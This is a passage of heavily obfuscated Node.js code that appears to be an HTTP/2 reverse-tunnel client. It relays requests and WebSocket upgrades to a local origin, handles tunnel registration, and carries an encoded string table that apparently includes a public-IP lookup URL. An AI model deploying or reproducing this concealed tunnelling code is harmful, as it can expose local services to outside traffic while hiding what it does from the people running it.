                'KIiKm': iw(0x35f),
                'Wxbhh': iw(0xd56)
            };
        try {
            const d = await c[iw(0x311)](a0bD, this['origin'], b[iw(0x174)], b['path'], b[iw(0x57f)], Buffer[iw(0x83f)](b[iw(0x344)])), f = [], g = [];
            for (const [k, l] of d[iw(0x57f)]) {
                const m = k['toLowerCase']();
                m === c[iw(0xbcf)] && g[iw(0xb66)]([
                    m,
                    l
                ]);
                const n = m['startsWith'](c[iw(0xb21)]) || m[iw(0x1ba)](iw(0x86d)) || m[iw(0x1ba)](c[iw(0xd90)]) || m[iw(0x1ba)](':');
                (!n || c['vZsHX'](m, c['cdYKD']) || c['vZsHX'](m, c[iw(0xb85)]) || c[iw(0x9b6)](m, iw(0xf36))) && f[iw(0xb66)]([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === iw(0x374))) {
                const o = c[iw(0x7ab)](a0bs, b[iw(0x4fa)]);
                o && f[iw(0xb66)]([
                    c['dUuhS'],
                    o
                ]);
            }
            const h = c[iw(0x1003)](a0bw, f), i = c[iw(0x9b6)](d[iw(0x13d)], 0x65) ? 0xc8 : d[iw(0x13d)], j = [
                    [
                        c[iw(0xbe3)],
                        c[iw(0xb33)](String, i)
                    ],
                    ...g,
                    [
                        c[iw(0x107a)],
                        h
                    ],
                    [
                        iw(0x34b),
                        c[iw(0xe27)]
                    ]
                ];
            this['sendHeaders'](a, j);
            for await (const p of d[iw(0x344)]) {
                await this[iw(0x7f2)](a, p, ![]);
            }
            await this['sendData'](a, Buffer[iw(0x901)](0x0), !![]);
        } catch (q) {
            this['log'][iw(0xfdf)](c[iw(0xcd1)](c[iw(0xb11)](c['zXhmz'](c['KIiKm'], a), iw(0xac4)), q));
            try {
                this[iw(0xc79)](a, [[
                        c[iw(0xbe3)],
                        c[iw(0x81f)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0d9(0xbf2)]() {
        const ix = a0d9, a = {
                'mPUPk': 'PRI\x20*\x20HTTP/2.0\x0d\x0a\x0d\x0aSM\x0d\x0a\x0d\x0a',
                'WgDfY': function (d, f) {
                    return d + f;
                },
                'gmwha': function (d, f) {
                    return d === f;
                },
                'pVaSZ': function (d, f) {
                    return d & f;
                },
                'qyGtW': function (d, f) {
                    return d % f;
                },
                'Lnext': function (d, f) {
                    return d < f;
                },
                'jBoAI': function (d, f) {
                    return d - f;
                },
                'zpLdr': function (d, f) {
                    return d >= f;
                },
                'uHCqQ': function (d, f) {
                    return d <= f;
                },
                'OtEoP': function (d, f) {
                    return d === f;
                },
                'uMgUp': function (d, f) {
                    return d !== f;
                },
                'QIKlj': function (d, f) {
                    return d === f;
                },
                'YnUdt': function (d, f) {
                    return d === f;
                }
            }, b = await this[ix(0x63c)][ix(0x658)](0x18);
        if (!b[ix(0x9bd)](Buffer['from'](a['mPUPk'])))
            throw new Error(ix(0x2b6));
        const c = Buffer[ix(0x901)](0x6);
        c['writeUInt16BE'](0x3, 0x0), c[ix(0xb3f)](0x64, 0x2), this[ix(0x4ee)](0x4, 0x0, 0x0, c);
        this['showTunnel'] && !this['tunnelState'][ix(0xf62)] && (process[ix(0x681)][ix(0xc5e)](a[ix(0x778)](this[ix(0x8fd)], '\x0a')), this[ix(0xbb7)]['printed'] = !![]);
        try {
            while (!this['stopped']) {
                const [d, f, g, h] = await this[ix(0x69f)]();
                if (a[ix(0x1054)](d, 0x4)) {
                    if (!a[ix(0xc47)](f, 0x1)) {
                        if (a[ix(0x2fe)](h[ix(0xc54)], 0x6))
                            throw new Error('invalid\x20SETTINGS\x20payload');
                        for (let i = 0x0; a['Lnext'](i, h[ix(0xc54)]); i += 0x6) {
                            const j = h[ix(0xc6f)](i), k = h[ix(0x53d)](a[ix(0x778)](i, 0x2));
                            if (a[ix(0x1054)](j, 0x4)) {
                                const l = a['jBoAI'](k, 0xffff);
                                for (const m of this[ix(0xb67)][ix(0xfa8)]()) {
                                    this[ix(0xb67)][ix(0x42d)](m, Math[ix(0x37f)](0x0, this['streamWindows'][ix(0xb12)](m) + l));
                                }
                            } else
                                a[ix(0x1054)](j, 0x5) && a[ix(0xe6c)](k, 0x4000) && a['uHCqQ'](k, 0xffffff) && (this[ix(0x550)] = k);
                        }
                        this['sendFrame'](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a['gmwha'](d, 0x6)) {
                    !(f & 0x1) && this[ix(0x4ee)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[ix(0xd0c)](d, 0x8)) {
                    if (a[ix(0x67d)](h[ix(0xc54)], 0x4))
                        continue;
                    const n = a[ix(0xc47)](h['readUInt32BE'](0x0), 0x7fffffff);
                    a[ix(0x475)](g, 0x0) ? this['connectionWindow'] += n : this[ix(0xb67)][ix(0x42d)](g, a[ix(0x778)](this[ix(0xb67)][ix(0xb12)](g) ?? 0xffff, n));
                    this[ix(0xcfd)]();
                    continue;
                }
                if (a[ix(0x475)](d, 0x3)) {
                    this[ix(0x9c3)]['delete'](g);
                    continue;
                }
                if (a[ix(0x475)](d, 0x7))
                    break;
                if (a['gmwha'](d, 0x1)) {
                    const o = await this[ix(0xa50)](f, g, h);
                    !this[ix(0xb67)][ix(0xe1a)](g) && this[ix(0xb67)]['set'](g, 0xffff);
                    this['handleHeaders'](g, f, o);
                    continue;
                }
                if (a[ix(0xbb9)](d, 0x0)) {
                    this['handleData'](g, f, h);
                    continue;
                }
            }
        } finally {
            this[ix(0x394)] = !![], this[ix(0xbee)]();
            for (const p of this[ix(0x9c3)][ix(0x570)]()) {
                p[ix(0x6eb)] && p[ix(0x6eb)][ix(0xe73)]();
            }
            try {
                this[ix(0x50a)][ix(0x28a)]();
            } catch (q) {
            }
        }
    }
    [a0d9(0x473)](a, b, c) {
        const iy = a0d9, d = {
                'CCxBd': function (i, j) {
                    return i === j;
                },
                'qYYCj': iy(0x364),
                'kuZKf': iy(0xf69),
                'PEwKQ': iy(0x5d2),
                'OJwQw': function (i, j) {
                    return i === j;
                },
                'VTAyp': function (i, j) {
                    return i === j;
                },
                'PZYju': iy(0x5c1),
                'sCZUP': function (i, j) {
                    return i(j);
                },
                'cBDsl': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i['startsWith'](':') ? f[i] = j : f[i[iy(0x544)]()] = j;
        }
        const g = (f[a0b1] || '')['trim']()[iy(0x544)]();
        if (d[iy(0x805)](g, a0b2)) {
            this['openControl'](a);
            b & 0x1 && (this[iy(0xfc8)][iy(0x329)] = !![]);
            return;
        }
        const h = {
            'method': f[d[iy(0x270)]] || iy(0x249),
            'path': f[d[iy(0xcb6)]] || '/',
            'authority': f[d[iy(0x290)]] || '',
            'headers': c[iy(0x595)](([k]) => !k[iy(0x1ba)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[iy(0x5d1)](g, iy(0x5c1)) || d[iy(0xafd)]((f[iy(0xd95)] || '')['toLowerCase'](), d[iy(0x99b)]),
            'ended': d[iy(0x14a)](Boolean, d[iy(0x2cf)](b, 0x1)),
            'finished': ![]
        };
        this['streams'][iy(0x42d)](a, h);
        if (h[iy(0x5c1)])
            h[iy(0x6eb)] = new a0bz(this, a, h, this[iy(0x324)], this[iy(0x4c7)]), h[iy(0x6eb)][iy(0x373)]();
        else
            h[iy(0xac3)] && this['requestFinished'](a, h);
    }
    [a0d9(0x1c6)](a, b, c) {
        const iz = a0d9, d = {
                'dkURd': function (g, h) {
                    return g !== h;
                },
                'artbx': function (g, h) {
                    return g === h;
                },
                'rsgur': function (g, h) {
                    return g === h;
                },
                'CLQDb': function (g, h) {
                    return g(h);
                },
                'ndcpv': function (g, h) {
                    return g & h;
                }
            };
        this[iz(0x940)](0x0, c[iz(0xc54)]), this['sendWindowUpdate'](a, c[iz(0xc54)]);
        if (d['dkURd'](this['control'], null) && d[iz(0xa4c)](this['control'][iz(0x68d)], a)) {
            this[iz(0xfc8)][iz(0x896)](c);
            b & 0x1 && (this['control'][iz(0x329)] = !![]);
            return;
        }
        const f = this[iz(0x9c3)][iz(0xb12)](a);
        if (d['rsgur'](f, undefined))
            return;
        if (d[iz(0x2b2)](f[iz(0x6eb)], undefined)) {
            f[iz(0x6eb)]['feed'](c, d[iz(0xd0e)](Boolean, b & 0x1));
            return;
        }
        c[iz(0xc54)] && f[iz(0x344)][iz(0xb66)](c), d[iz(0xcd8)](b, 0x1) && (f[iz(0xac3)] = !![], this[iz(0x4ab)](a, f));
    }
}
class a0bz {
    constructor(a, b, c, d, f) {
        const iA = a0d9, g = { 'iXUPo': iA(0x64e) }, h = g[iA(0xe9b)][iA(0xa6a)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this[iA(0x68d)] = b;
                continue;
            case '1':
                this[iA(0x394)] = ![];
                continue;
            case '2':
                this[iA(0xdd7)] = [];
                continue;
            case '3':
                this[iA(0x9dd)] = a;
                continue;
            case '4':
                this['waiters'] = [];
                continue;
            case '5':
                this[iA(0xfc5)] = c;
                continue;
            case '6':
                this['sock'] = null;
                continue;
            case '7':
                this['log'] = f;
                continue;
            case '8':
                this[iA(0x324)] = d;
                continue;
            }
            break;
        }
    }
    [a0d9(0x373)]() {
        const iB = a0d9;
        this[iB(0xbf2)]()[iB(0x92f)](() => {
        });
    }
    [a0d9(0x896)](a, b = ![]) {
        const iC = a0d9;
        a[iC(0xc54)] && this[iC(0xdd7)][iC(0xb66)](a), b && this[iC(0xdd7)][iC(0xb66)](null), this[iC(0x8c5)]();
    }
    [a0d9(0xe73)]() {
        const iD = a0d9, a = {
                'cAhLJ': function (b, c) {
                    return b !== c;
                }
            };
        if (this[iD(0x394)])
            return;
        this[iD(0x394)] = !![], this[iD(0x8c5)]();
        if (a[iD(0x98a)](this[iD(0x50a)], null))
            try {
                this['sock'][iD(0x28a)]();
            } catch (b) {
            }
    }
    [a0d9(0x8c5)]() {
        const iE = a0d9, a = {
                'EBONc': function (b) {
                    return b();
                }
            };
        for (const b of this[iE(0xa41)]) {
            a[iE(0xa2d)](b);
        }
        this['waiters'] = [];
    }
    async [a0d9(0x79a)]() {
        const iF = a0d9;
        while (!this[iF(0x394)]) {
            if (this['queue'][iF(0xc54)])
                return this['queue'][iF(0x719)]();
            await new Promise(a => this[iF(0xa41)]['push'](a));
        }
        return null;
    }
    async [a0d9(0xbf2)]() {
        const iG = a0d9, a = {
                'nlAke': function (b, c) {
                    return b(c);
                },
                'NnSDN': function (b, c) {
                    return b(c);
                },
                'jzjTp': function (b, c) {
                    return b === c;
                },
                'kTBYW': iG(0xddc),
                'bOaRO': 'cf-proxy-',
                'JIjmE': function (b, c) {
                    return b === c;
                },
                'qMQmu': 'connection',
                'dQVVR': function (b, c) {
                    return b === c;
                },
                'VKMfP': iG(0xfe6),
                'uFkDe': function (b, c) {
                    return b === c;
                },
                'LajdG': 'sec-websocket-accept',
                'NfzzM': function (b, c) {
                    return b(c);
                },
                'SiJvr': iG(0x8c8),
                'LfiyP': function (b, c) {
                    return b(c);
                },
                'wKAPJ': iG(0x8d3),
                'Mbtpj': iG(0x34b),
                'VFhrT': iG(0xc53),
                'coTzG': function (b, c) {
                    return b + c;
                },
                'UITAe': iG(0xba3),
                'lGBtD': iG(0xd56)
            };
        try {
            this[iG(0x50a)] = await a['nlAke'](a0bB, this[iG(0x324)]), this['sendHandshake']();
            const b = await a['NnSDN'](a0bE, this['sock']), c = [], d = [];
            for (const [i, j] of b[iG(0x57f)]) {
                const k = i['toLowerCase']();
                a[iG(0x23d)](k, iG(0x8b6)) && d[iG(0xb66)]([
                    k,
                    j
                ]);
                const l = k[iG(0x1ba)](a[iG(0x7d3)]) || k['startsWith'](iG(0x86d)) || k['startsWith'](a[iG(0xfe0)]) || k[iG(0x1ba)](':');
                (!l || a[iG(0x8cd)](k, a[iG(0xa9f)]) || a[iG(0xb81)](k, a[iG(0x54b)]) || a[iG(0x254)](k, a[iG(0xac9)])) && c[iG(0xb66)]([
                    k,
                    j
                ]);
            }
            const f = a['NfzzM'](a0bw, c), g = b[iG(0x13d)] === 0x65 ? 0xc8 : b['status'], h = [
                    [
                        a[iG(0x16d)],
                        a[iG(0x7bc)](String, g)
                    ],
                    ...d,
                    [
                        a['wKAPJ'],
                        f
                    ],
                    [
                        a[iG(0x375)],
                        a[iG(0x466)]
                    ]
                ];
            this[iG(0x9dd)][iG(0xc79)](this[iG(0x68d)], h), this[iG(0xd61)]()[iG(0x92f)](() => {
            }), await this['pumpOrigin'](b['rest']);
        } catch (m) {
            this[iG(0x4c7)][iG(0xfdf)](a['coTzG'](a['coTzG'](iG(0x3c3) + this[iG(0x68d)], a[iG(0x420)]), m));
            try {
                this['connection'][iG(0xc79)](this[iG(0x68d)], [[
                        a[iG(0x16d)],
                        a[iG(0x3a0)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this['stop']();
        }
    }
    async [a0d9(0x1069)](a) {
        const iH = a0d9;
        a[iH(0xc54)] && await this[iH(0x9dd)][iH(0x7f2)](this[iH(0x68d)], a, ![]);
        for await (const b of this[iH(0x50a)]) {
            if (this['stopped'])
                break;
            await this[iH(0x9dd)][iH(0x7f2)](this[iH(0x68d)], b, ![]);
        }
        !this['stopped'] && await this['connection']['sendData'](this[iH(0x68d)], Buffer[iH(0x901)](0x0), !![]);
    }
    async [a0d9(0xd61)]() {
        const iI = a0d9;
        while (!this[iI(0x394)]) {
            const a = await this[iI(0x79a)]();
            if (a === null)
                return;
            try {
                this[iI(0x50a)][iI(0xc5e)](a);
            } catch (b) {
                this[iI(0x394)] = !![];
                return;
            }
        }
    }
    [a0d9(0x548)]() {
        const iJ = a0d9, a = {
                'YQWZC': function (i, j) {
                    return i + j;
                },
                'PiOfI': function (i, j) {
                    return i + j;
                },
                'ciXEk': '\x20HTTP/1.1',
                'MBkRC': function (i, j) {
                    return i === j;
                },
                'LiPgh': iJ(0xd00),
                'BOmfA': iJ(0x9dd),
                'eEBHw': function (i, j) {
                    return i === j;
                },
                'gYzci': iJ(0xfe6),
                'BDYkE': function (i, j) {
                    return i === j;
                },
                'YzsCX': 'transfer-encoding',
                'DntEL': function (i, j) {
                    return i === j;
                },
                'PqcHa': 'sec-websocket-key',
                'iCyct': iJ(0x90e),
                'pkolV': function (i, j) {
                    return i + j;
                },
                'GXoRB': function (i, j) {
                    return i + j;
                },
                'sdLnj': function (i, j) {
                    return i + j;
                },
                'IuASK': iJ(0x35e),
                'kvQOV': iJ(0x93b),
                'rZlFh': iJ(0xf73),
                'pDobP': iJ(0x66e),
                'fWmbN': 'Sec-WebSocket-Version:\x2013',
                'eiYpB': iJ(0x1049),
                'jXRKl': iJ(0x2cd),
                'AxAaB': function (i, j) {
                    return i + j;
                },
                'CJwmA': iJ(0xcba),
                'wjBAd': iJ(0xc2b)
            }, b = new URL(this[iJ(0x324)]), c = this[iJ(0xfc5)][iJ(0x4fa)][iJ(0x1ba)]('/') ? this['request'][iJ(0x4fa)] : a[iJ(0xcc4)]('/', this['request'][iJ(0x4fa)]), d = [a['PiOfI'](a['YQWZC'](iJ(0x3e0), c), a['ciXEk'])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request']['headers']) {
            const k = i[iJ(0x544)]();
            if (a['MBkRC'](k, a[iJ(0x923)]) || k === a[iJ(0xdce)] || a['eEBHw'](k, a[iJ(0x51b)]) || a[iJ(0x8d7)](k, 'content-length') || a[iJ(0xa63)](k, a[iJ(0xb1e)]))
                continue;
            if (a[iJ(0x78d)](k, a[iJ(0xdea)]))
                f = !![];
            else {
                if (a[iJ(0x78d)](k, a[iJ(0x48d)]))
                    g = !![];
                else
                    a[iJ(0x78d)](k, iJ(0x324)) && (h = !![]);
            }
            d[iJ(0xb66)](a[iJ(0xd23)](a[iJ(0x43e)](i, ':\x20'), j));
        }
        d[iJ(0xb66)](a[iJ(0xbfb)](a[iJ(0x35b)], b['host'])), !h && this[iJ(0xfc5)][iJ(0xb73)] && d['push'](a[iJ(0x43e)](a[iJ(0xe79)], this[iJ(0xfc5)][iJ(0xb73)])), !f && d[iJ(0xb66)](a[iJ(0xbfb)](a[iJ(0x9de)], a0k[iJ(0x7bb)](0x10)[iJ(0x43a)](a[iJ(0xec3)]))), !g && d[iJ(0xb66)](a['fWmbN']), d[iJ(0xb66)](a['eiYpB']), d[iJ(0xb66)](a['jXRKl']), this[iJ(0x50a)][iJ(0xc5e)](Buffer['from'](a[iJ(0xf63)](d[iJ(0xd9d)]('\x0d\x0a'), a[iJ(0xeac)]), a[iJ(0x610)]));
    }
}
class a0bA {
    constructor(a, b, c, d = {}) {
        const iK = a0d9, f = {
                'xpLAp': iK(0x523),
                'Fbmzd': function (i, j) {
                    return i === j;
                }
            }, g = f[iK(0x596)][iK(0xa6a)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this['log'] = c;
                continue;
            case '1':
                this['connection'] = a;
                continue;
            case '2':
                this['buffer'] = Buffer[iK(0x901)](0x0);
                continue;
            case '3':
                this['streamId'] = b;
                continue;
            case '4':
                this[iK(0x329)] = ![];
                continue;
            case '5':
                this[iK(0xa7d)] = f[iK(0xb30)](d['quic'], !![]);
                continue;
            }
            break;
        }
    }
    [a0d9(0x373)](a, b, c, d) {
        const iL = a0d9, f = {
                'oOwIw': function (g, h) {
                    return g(h);
                },
                'dKgTR': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[iL(0x9dd)][iL(0x7f2)](this[iL(0x68d)], f['oOwIw'](a0bh, 0x0), ![]), this[iL(0x9dd)][iL(0x7f2)](this[iL(0x68d)], f[iL(0x891)](a0bi, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0d9(0x896)](a) {
        const iM = a0d9, b = {
                'fdaJa': function (f, g) {
                    return f(g);
                },
                'xqlHV': function (f, g) {
                    return f(g);
                },
                'CwbBd': function (f, g) {
                    return f + g;
                },
                'dvIMx': 'unknown',
                'hvyBp': 'unknown\x20error',
                'wMJTJ': iM(0x726)
            };
        this[iM(0x82f)] = this[iM(0x82f)][iM(0xc54)] ? Buffer[iM(0x83f)]([
            this[iM(0x82f)],
            a
        ]) : a;
        let c, d;
        [c, d] = b[iM(0xae9)](a0bj, this[iM(0x82f)]), this[iM(0x82f)] = d;
        for (const f of c) {
            try {
                const g = b[iM(0x31a)](a0bo, f);
                if (g[iM(0x177)])
                    continue;
                g['ok'] ? (this[iM(0x4c7)]['info'](b[iM(0xe86)](iM(0xc96), g[iM(0xe1e)] || b[iM(0x792)])), this['connection'][iM(0xcf3)] = !![]) : (this[iM(0x4c7)][iM(0xfdf)](b[iM(0xe86)]('tunnel\x20registration\x20failed:\x20', g[iM(0xfcc)] || b[iM(0xd34)])), this['connection'][iM(0xb25)] = !![], this[iM(0x9dd)][iM(0x394)] = !![]);
            } catch (h) {
                this[iM(0x4c7)]['debug'](b[iM(0x88c)] + h);
            }
        }
    }
}
function a0bB(a) {
    const iN = a0d9, b = {
            'EuiXX': iN(0xabd),
            'UXtUV': function (c, d) {
                return c(d);
            },
            'LyeFr': function (c, d, f) {
                return c(d, f);
            },
            'GyaJM': iN(0x343),
            'oxLFf': iN(0xf9e),
            'fEAsz': function (c, d) {
                return c(d);
            },
            'HqdWd': iN(0x5ea),
            'jsORt': iN(0xfcc),
            'YVwdc': iN(0xa20)
        };
    return new Promise((c, d) => {
        const iQ = iN, f = {
                'vyEbp': function (n, o, p) {
                    const iO = a0b;
                    return b[iO(0x9d1)](n, o, p);
                },
                'vmIhS': function (n, o, p) {
                    const iP = a0b;
                    return b[iP(0x9d1)](n, o, p);
                },
                'pkRmC': b['GyaJM']
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[iQ(0xd1a)](d, new Error(iQ(0x5ea)));
            return;
        }
        if (![
                'http:',
                b['oxLFf']
            ]['includes'](g[iQ(0x971)]) || !g[iQ(0x8d1)]) {
            b[iQ(0x2ba)](d, new Error(b['HqdWd']));
            return;
        }
        const h = g[iQ(0x971)] === b[iQ(0xe11)], i = g[iQ(0x5c6)] || (h ? 0x1bb : 0x50), j = a0i[iQ(0xa20)]({
                'host': g[iQ(0x8d1)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const iR = iQ, q = b['EuiXX']['split']('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        b['UXtUV'](o, p);
                        continue;
                    case '1':
                        if (k)
                            return;
                        continue;
                    case '2':
                        j[iR(0x9f2)](0x0);
                        continue;
                    case '3':
                        k = !![];
                        continue;
                    case '4':
                        j[iR(0xca0)](iR(0xfcc), m);
                        continue;
                    }
                    break;
                }
            }, m = o => {
                !k && f['vyEbp'](l, d, o);
            };
        j['on'](b[iQ(0xcca)], m), j[iQ(0x9f2)](0x7530, () => j[iQ(0x28a)](new Error('origin\x20connection\x20timeout'))), j['on'](b[iQ(0xcff)], () => {
            const iS = iQ, o = {
                    'bJLwL': function (q, r, s) {
                        return f['vyEbp'](q, r, s);
                    }
                };
            if (!h) {
                f['vyEbp'](l, c, j);
                return;
            }
            const p = a0j[iS(0xa20)]({
                'socket': j,
                'servername': g[iS(0x8d1)]
            });
            p['on'](iS(0xfcc), q => {
                const iT = iS;
                !k && o[iT(0x898)](l, d, q);
            }), p['on'](f[iS(0xa66)], () => {
                const iU = iS;
                f[iU(0x225)](l, c, p);
            });
        });
    });
}
function a0bC(a) {
    const iV = a0d9, b = {
            'KJKps': function (d, f) {
                return d < f;
            }
        }, c = [];
    for (let d = 0x0; b[iV(0xe85)](d, a[iV(0x508)][iV(0xc54)]); d += 0x2) {
        c[iV(0xb66)]([
            a[iV(0x508)][d],
            a[iV(0x508)][d + 0x1]
        ]);
    }
    return c;
}
function a0bD(a, b, c, d, f) {
    const iW = a0d9, g = {
            'bSInW': function (h, i) {
                return h(i);
            },
            'amZWr': function (h, i) {
                return h(i);
            },
            'rXKed': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'DdaCO': 'https:',
            'irCRu': function (h, i) {
                return h === i;
            },
            'qZzph': 'host',
            'utqhC': function (h, i) {
                return h === i;
            },
            'TjOjb': iW(0x9dd),
            'elOXF': 'transfer-encoding',
            'CvNsM': iW(0x5d8),
            'aYcDL': function (h, i) {
                return h(i);
            },
            'kzOYy': function (h, i) {
                return h + i;
            }
        };
    return new Promise((h, i) => {
        const iX = iW;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            g[iX(0xb3e)](i, new Error(g[iX(0x1042)]));
            return;
        }
        if (![
                iX(0xa5f),
                g['DdaCO']
            ][iX(0x152)](j[iX(0x971)]) || !j[iX(0x8d1)]) {
            g[iX(0xb3e)](i, new Error('origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL'));
            return;
        }
        const k = g[iX(0xa1b)](j[iX(0x971)], g[iX(0x4f0)]), l = j[iX(0x5c6)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r[iX(0x544)]();
            if (g[iX(0xa1b)](t, g[iX(0xa87)]) || g[iX(0x980)](t, g[iX(0xc4f)]) || t === g[iX(0xbf9)] || g[iX(0x980)](t, 'content-length'))
                continue;
            m[r] = s;
        }
        m['Host'] = j[iX(0xd00)];
        f[iX(0xc54)] && (m[g[iX(0x1f5)]] = g[iX(0xccf)](String, f[iX(0xc54)]));
        const n = c[iX(0x1ba)]('/') ? c : g[iX(0xad8)]('/', c), o = k ? a0h : a0g, p = o[iX(0xfc5)]({
                'hostname': j[iX(0x8d1)],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const iY = iX;
                g['bSInW'](h, {
                    'status': u[iY(0xafa)],
                    'headers': g[iY(0x1063)](a0bC, u),
                    'body': u
                });
            });
        p['on'](iX(0xfcc), u => i(u)), p[iX(0xdc9)](f[iX(0xc54)] ? f : undefined);
    });
}
function a0a() {
    const oQ = [
        'AeXSv3G',
        'wNjTsM8',
        'CNLItxG',
        'EunfzNC',
        'D3jPDgfIBgu',
        'tNrvB2i',
        'r2LOAe4',
        'x3jLy29YzfjLy2vPDMvK',
        'CMvZDw1L',
        'BKPQBuO',
        'vvrkA0y',
        'qKHhseu',
        'CLv4sxO',
        'Dw5Oyw5KBgvKuMvQzwn0Aw9U',
        'BwfW',
        'z3zcDKK',
        'w1DbuK5Diev4y2vWDgLVBIbSB2fKAw5Nie5VAxnLig1VzhvSztO',
        'z2vUzxjHDgvtAw5NBgu',
        'q09cBLi',
        't3LZDeu',
        'CNjyBwW',
        'zg9OuxvLCNK',
        'C2vJlxDLyNnVy2TLDc1Hy2nLChq',
        'CMvZ',
        'swTsCg0',
        'ANLmDuG',
        'ufPxzNK',
        'AxDuuNG',
        'CgfYDgLHBa',
        'zKHtq0m',
        'ywnJzxnZx2rLBMLLza',
        'tK9ju0vFuK9mrv9srvnqt05ervi',
        'zxHLy3v0ywjSzq',
        'C2vJCMv0',
        'Bvf4vMO',
        'qhf3Cw8G57Y65Bcria',
        'rMLSzsb1CgXVywrLzcbZDwnJzxnZzNvSBhKU',
        'CfDSu2m',
        'zgvJCNLWDa',
        'ugL1u28',
        'A2v5x3nVDxjJzq',
        'C1L6zei',
        'BfPwy1O',
        'AxrLBxmGCMvXDwLYzwqGkg5VBI1LBxb0EsbHCNjHEsK',
        'Ew1wu1K',
        'mhWYFdr8mxW2Fdn8nq',
        'x2DLDenVBMzPz1zHBhvL',
        'zhLUyw1Py1nPEMu',
        'ksWG',
        'EfnJALO',
        'vKH2rwm',
        'zNfRBKS',
        'z0vtueq',
        'AgfUzhnOywTLrMLUAxnOzwq',
        'wxrIA3a',
        'u3DvtMi',
        'z2n5v04',
        'zMLKA0O',
        'DhvUBMvS',
        'q29UzMLNihzHBgLKyxrLza',
        'DvrRuMq',
        'zgvJB2rLCG',
        'C2H6lMfSihjLCxvLC3qGDgLTzw91Da',
        'txvSt1G',
        'BgfZDeLUzgv4t2y',
        'BgLZDezPBgvZ',
        'ChjPBNrLza',
        'qxHbyui',
        'lcdKUjtPMPtNPRVLPlhOTku6ia',
        'qxPouxK',
        'x3n0yxj0',
        'vKXgtxi',
        'tNzpBxi',
        'oNbHDgG',
        'uu5yqwy',
        'zNntAxPL',
        'Ahr0Chm6lY9ZAhOUywWVFG',
        'vvfcAgS',
        'C3LZDgvT',
        'x3n0B3bgBgfN',
        'AMrZAu0',
        'zxHWzwn0zwqGveXtifnLCNzLCKHLBgXV',
        'C2DpAMK',
        'u2vJlvDLyLnVy2TLDc1lzxK6ia',
        'vwLHvfG',
        'vvDRwge',
        'uwjoBNC',
        'CKvAuwW',
        'uNfJwwG',
        'Awv0vxG',
        'zMLUAxnO',
        'ktOG',
        'l2fWAs90yxnRl2nYB24',
        'Dg9cExrLqxjYyxK',
        'x21HCMTlBw9Kzti',
        'zefswMW',
        'BMv4DeXVy2fSu3rYzwfT',
        'wLjXDwG',
        'x2jHC2vjBMzVtM93txm',
        'CNziB2O',
        'B0fHBvy',
        'Bg9JywXqCML2qJy0',
        'DhzgAu8',
        'zgf0ywDYyw0',
        'zuz1Dxy',
        't1DjwxK',
        'y2fJAgu',
        'DxbKyxrLlwnVBMzPz3vYyxrPB24',
        'ru1KB3a',
        'z3jVDxa',
        'C2vYDMvxzwjZB2nRzxq',
        'zw5JB2rPBMC',
        'ic0Tls0G',
        'x21VDw50uMvHze9UBhLgCM9Ttw91BNrjBMzV',
        'DgvZDa',
        'C1Djz0y',
        'sKLMwLy',
        'CYa+ia',
        'x3jLCg9YDejVDw5Kqxn5BMm',
        'BwvT',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5l21LBw9YEs51C2fNzv9PBL9IExrLCW',
        'zNjADvC',
        't1u9q2XVDwrgBgfYzsbpCMLNAw4Gu1nm',
        'CMvHBhbHDgHtEw5J',
        'weXisM4',
        'sNP0AfO',
        'Ahr0Chm6',
        'CMvZDg9Yzq',
        'C1PcBfa',
        'uLbdihjLDhvYBIb1BMLVBIa',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'C3LZDgvTza',
        'C291CMnL',
        'sMT4Awe',
        'wfforKC',
        'w0Tnt0rfxsdIMQdVUi8G5z+F5zcn5PAh5lU25yIG6zMK5AsX6lsLicG',
        'A2v5CW',
        'DuLpAMS',
        'z0rSqMi',
        'x2TLEq',
        'CMv0CMfUC21PDhm',
        'sKPLB2S',
        'ChrVq291BNq',
        'C3rHDgLJrMfSBgjHy2S',
        'zw5JCNLWDa',
        'zgfIy1m',
        'rejKwg4',
        'BMvNB3rPyxrLzefSCg4',
        'Bwf4sw5MBgLNAhq',
        'A21VzguY',
        'AxnjBML0Awf0B3i',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'DgLzthi',
        're9VD3i',
        'q2nhyMu',
        'AxnFyxv0AgvUDgLJyxrLza',
        'sMrRsKS',
        'DxLAy3m',
        'Bwv0ywrHDge',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5lM1HEa',
        'AgreCum',
        'su5gtW',
        'zMfPBgvKihrVignYzwf0zsb0Dw5UzwW6ia',
        'ls0ncG',
        'Ag9TzwrPCG',
        'CMvXDwvZDa',
        'w0Tnt0rfm10G4PQG77IpioAbOUwKJEAZQowgJoMHUsa',
        'C3rHCNr1Ca',
        'y29UDhjVBa',
        'koACQUIUVUE9RIWG57Y655Yb5Asn55sOieToqu1fkq',
        'BwvYz2u',
        'D1ryvhG',
        'zxjYB3i',
        'BwTeq1m',
        'Ahr0Chm6lY9PCgLUzM8UAw8VAxa',
        'tufss1nFuLvox1jpt1q',
        'B2D1z3G',
        's3PRsMe',
        'yxbWBhK',
        'r0zvr0e',
        'y0PUC3m',
        'DuPyzwi',
        'BgLUAW',
        'rxjHzwe',
